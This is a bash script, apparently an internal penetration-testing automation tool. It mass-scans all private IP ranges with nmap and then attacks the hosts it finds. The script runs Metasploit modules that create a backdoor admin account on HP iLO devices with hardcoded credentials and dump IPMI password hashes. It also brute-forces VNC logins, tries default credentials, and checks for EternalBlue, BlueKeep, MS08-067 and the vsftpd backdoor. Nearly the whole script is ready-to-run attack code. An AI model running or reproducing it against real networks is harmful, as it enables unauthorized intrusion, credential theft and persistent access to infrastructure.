#20210713: added backup of *.csv ...
#20210708: added 389 and 3269,636 to port list
#2020/10/21: added more excludes to PORT_IP_LINUX.csv (FOR CS)
#2020/10/20: backup old scan fils
#2020/10/20: fixed PORT_IP_LINUX.csv format

#2020/08/10: espaned top 40 to add apple ports 

# backup old scan data
export foldername=$(date +%Y%m%d)

mkdir "${foldername}"
mv *.xml "${foldername}"
mv *.gnmap "${foldername}"
mv *.nmap "${foldername}"
mv *.txt  "${foldername}"
mv *.csv "${foldername}"


export varNMAPFlags=' -v -T5  -sV -p 21-23,25,53,80-81,88,623,17990,17988,3283,110-111,113,135,139,143,179,199,363,389,443,445,465,514,548,554,587,636,993,995,1025-1026,1720,1723,2000,3268,3269,3306,3389,5060,5900,6001,8000,8080,8443,8888,9191,10000,32768,50000,7001  --open --randomize-hosts --defeat-rst-ratelimit  -O -sS -sV -sC '

sleep 10

echo `date` INFO: Performing smart 192,172 and 10. scans this takes about 5-7 days

echo `date` INFO: Starting 192.
nmap ${varNMAPFlags} -oA 192 192.168.0.0/16

# scan 10 and 172 just  1,2,3,10,20,30,100,254
echo `date` INFO: Starting 172.
nmap ${varNMAPFlags} -oA 172_GUESS 172.16-31.0-255.1,2,3,10,20,30,100,254
grep open 172_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 172_NETWORKS
nmap ${varNMAPFlags} -oA 172_NETWORKS -iL 172_NETWORKS

echo `date` INFO: Starting 10.
nmap ${varNMAPFlags}  -oA 10_GUESS 10.0-255.0-255.1,254
grep open 10_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 10_NETWORKS
nmap ${varNMAPFlags} -oA 10_NETWORKS -iL 10_NETWORKS



echo `date` INFO: Compleated Nmap
grep open *.gnmap | awk '{print $2}'|  sort -u | uniq -c | sort -nr > ALL_IPS_WITH_OPEN.csv


# IP,Portlist
grep open *.gnmap | grep -E "(Host: )" | sed 's/,/ /g'| sed 's/.*Host: //g' | sed -r 's/( \(.*\)).*Ports: /,\1,/g' | sed 's/\bIgnored State.*//g' | sed 's/\/\/\///g' > IP_PORTLIST.csv


# IP,DEVICE,HOSTNAME
grep  -Eiah "(Service Info|Nmap scan)" *.nmap|grep -B 1 "Service Info" | grep -v '\-\-'|sed -r 's/Service Info.*: /,/g' | tr -d '\n'| awk '{gsub("Nmap scan report for ","\n"); print}' | sed -r 's/(.*) \((.*)\)(.*)/\2\3,\1/g' > IP_DEVICE_HOSTNAME.csv
# get count of *nix servers
grep -h '22\/open' *.gnmap | grep -Evai "(Hiawatha|\bapc\b|idrac|AllegroSoft|cisco|Gateway|goahead|2016.74|Ricoh WS Discovery|sunssh|HP Integrated)" | sed 's/Seq.*//g'| sed 's/Ignored.*//g'| sed 's/  //g'|sed 's/\t//g' |sed 's/,/ /g'|sed -r 's/Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*Ports: (.*)/\2,\1 /g' > PORT_IP_LINUX.csv

# PORTS,IP
grep -h '\/open' *.gnmap | sed 's/Seq.*//g'| sed 's/Ignored.*//g'| sed 's/  //g'|sed 's/\t//g' |sed 's/,/ /g' | sed -r 's/Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*Ports: (.*)/\2,\1 /g' > PORTS_IP.csv

# subnet counts Up
grep open *.gnmap | grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u|  grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" | sort | uniq -c | sort -nr |awk '{print $1","$2}'> SUBNET_UP.csv

# suenet up count
grep open *.gnmap |grep open| grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u|  grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" | sort | uniq -c | sort -nr |awk '{print $1","$2}'> SUBNET_OPEN_PORTS.csv


# ./IP_DNS_HASH_PORT.txt
echo "IP,HostName,Hash,Ports" > ./IP_DNS_HASH_PORT.csv
cat *.gnmap | sort -u | grep -v Up | sed 's/,/ /g' |sed -r 's/Host: (.*) \((.*)\).*Ports: (.*)/echo "\1","\2",`echo "\3"|base64 -w 0`",\3"/ge' >> ./IP_DNS_HASH_PORT.csv


# clean /tmp
 
rm /tmp/*.csv

# copy
cp *.csv /tmp
chmod 744 /tmp/*.csv



echo `date` INFO: Running FRUIT path assumes you have ./metasploit/msfconsole ./changeme/changeme.py ./SAP_GW_RCE_exploit

echo FRUIT!
#iDRAC login check
grep -iaE  "(Mbedthis|idrac)" *.gnmap | awk '{print $2}' | sort -u > idrac.txt

cat <<EOF> idrac.rc
use auxiliary/scanner/http/dell_idrac
set THREADS 50
set RHOSTS file:$PWD/idrac.txt
run
quit
EOF

msfconsole -r idrac.rc | tee SAUSE_idrac.txt

cat SAUSE_idrac.txt | grep SUCC | sort -u | sed -r 's/.*https:\/\/(.*):.* user (.*)/\1,\2/g' >> SAUSE_ALL.csv

#ms08067
grep -E "(445\/open|137\/open)" *.gnmap | awk '{print $2}' | sort -u > ms08067.txt
nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5 --script smb-vuln-ms08-067.nse -p445 -iL ms08067.txt -oA ms08067
grep VULNERABLE ms08067.* | tee SAUSE_ms08067.txt
grep -E "(Nmap scan r|VULNERABLE)"  ms08067.nmap|grep -B 1 "VULNERABLE:" | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sed 's/$/,ms08067/g' >> SAUSE_ALL.csv


# iLO

grep -E "(iLO|Nmap scan)" *.nmap | grep -B 1 iLO | grep Nmap | awk '{print $5}' > ilo.txt

cat <<EOF> hp_ilo_create_admin_account.rc
use auxiliary/admin/hp/hp_ilo_create_admin_account
set USERNAME robertmccurdy
set PASSWORD NoxOnBoxOnSox
set RHOSTS file:$PWD/ilo.txt
run
quit
EOF

msfconsole -r hp_ilo_create_admin_account.rc  |tee SAUSE_hp_ilo_create_admin_account.txt

grep -E "(user already exists|created successfully|Running module against)" SAUSE_hp_ilo_create_admin_account.txt | grep -E "(user already exists|created successfully)" -B 1 | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sed 's/$/,CVE-2017-12542 iLO auth bypass/g' >> SAUSE_ALL.csv



#IPMI hash dump 
grep -iE "(Nmap scan|ipmi)" * | grep -B 1 -ia ipmi | grep "Nmap scan report" | awk '{print $5}' |  grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" > ipmihash.txt

cat <<EOF> ipmihash.rc
use auxiliary/scanner/ipmi/ipmi_dumphashes
set THREADS 16
set RHOSTS file:$PWD/ipmihash.txt
run
quit
EOF

msfconsole -r ipmihash.rc  |tee  SAUSE_ipmi_hash.txt

grep 'Hash ' SAUSE_ipmi_hash.txt | sed 's/:/,/g' | sed -r 's/.*\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/\1/g' >> SAUSE_ALL.csv


#IPMI cipher zero
grep -iE "(dropbear)" *.gnmap|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > ipmi_cipher_zero.txt
nmap --open -p 623 --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -iL ipmi_cipher_zero.txt -oA ipmi_cipher_zero
grep -E "(623\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > ipmi_cipher_zero.txt

cat <<EOF> ipmihash.rc
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set THREADS 16
set RHOSTS file:$PWD/ipmi_cipher_zero.txt
run
quit
EOF

msfconsole -r ipmihash.rc |tee  SAUSE_ipmi_zero.txt

grep VULNERABLE  SAUSE_ipmi_zero.txt |  sed 's/:623 - /,/g' |sed -r 's/.*\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/\1/g' >>  SAUSE_ALL.csv


# apc
grep -Eia "(Nmap scan|power|apc)" *.nmap |grep -B 1 -Eia "(power|apc)" | grep Nmap | awk '{print $5}'|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  | sort -u > apc.txt

echo 'for i in `cat apc.txt`' > apc.sh
echo 'do ./changeme/changeme.py  $i &' >>apc.sh
echo 'sleep 1' >> apc.sh
echo 'done ' >> apc.sh

bash apc.sh | tee apc_out.txt

grep -ia '\-\-' -A 1 apc_out.txt |grep -v '\-\-'|grep -v read > SAUSE_APC.txt

cat SAUSE_APC.txt | sed -r 's/.*\/\/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(.*)/\1,\2/g' >> SAUSE_ALL.csv



#ms17-010
grep -E "(445\/open)" *.gnmap| awk '{print $2}' | sort -u > ms17.txt
nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  --script smb-vuln-ms17-010 -p445 -iL ms17.txt -oA ms17
grep VULNERABLE ms17.* > SAUSE_ms17.txt
grep -E "(Nmap scan|VULNERABLE)" ms17.nmap | grep VULNERABLE -B 1 | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u | sed 's/$/,smb-vuln-ms17-010 EternalBlue/g' >> SAUSE_ALL.csv 


#SAP check hot mess


grep -Eia "(sap)" *.gnmap|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  | sort -u > SAP.txt
nmap  --defeat-rst-ratelimit --max-retries 1 --min-parallelism 100  -p 3300 -iL SAP.txt -oA SAP -T5




IFS=$'\n'
 
cd /apps/RMCCURDY/NMAP




#  realvnc_41_bypass
grep -E "(5900\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > realvnc_41_bypass.txt
nmap --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  --script=realvnc-auth-bypass -p 5900 -iL realvnc_41_bypass.txt -oA realvnc_41_bypass
grep -E "(VULNERABLE:|Nmap scan)" realvnc_41_bypass.nmap | grep -B 1 'VULNERABLE:' | grep 'Nmap scan' | awk '{print $5",bl4ck-vncviewer-authbypass"}' >> SAUSE_ALL.csv


# rdpscan
grep -E "(3389\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > rdpscan.txt
./rdpscan/rdpscan --file rdpscan.txt --workers 10000 |tee rdpscan_out.txt
grep VULNERABLE rdpscan_out.txt | sed 's/ - VULNERABLE - got appid/,rdpscan for CVE-2019-0708 bluekeep vuln/g' >> SAUSE_ALL.csv 

#    vnc
grep -E "(5900\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > vnc.txt
echo `date` DEBUG: Checking for defualt logins for VNC with medusa scanner
medusa -M vnc -H vnc.txt -C  ./VNC/wordList_vnc.txt   -T 100 -L -f| tee SAUSE_VNC.txt
grep FOUND SAUSE_VNC.txt  | sed 's/.*Host: //g' | sed 's/ User/,User/g' >> SAUSE_ALL.csv


#vsftpd_234_backdoor
grep -E "(21\/open)" *|grep -ia vsftp | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > vsftpd_234_backdoor.txt
nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -p 21 --script ftp-vsftpd-backdoor -iL vsftpd_234_backdoor.txt -oA vsftpd_234_backdoor   |tee SAUSE_vsftpd_234_backdoor.txt
grep VULN vsftpd_234_backdoor.nmap >> SAUSE_ALL.csv


# add sysvold admin hash check
## Biszploit PIRA to get running
## eyewitness RDP and VNC ?
## webdump_burp ?
## changeme
#dir_webdav_unicode_bypass
#multi/http/jenkins_script_console
#open_x11 6000
#cisco_smart_install
#jboss_vulnscan
#tomcat_mgr_login
#hp_system_management
#hp_sys_mgmt_exec
#HP System Management - Anonymous Access Code Execution (Metasploit)
#https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/
#
#viem backup default
#Symantec backup

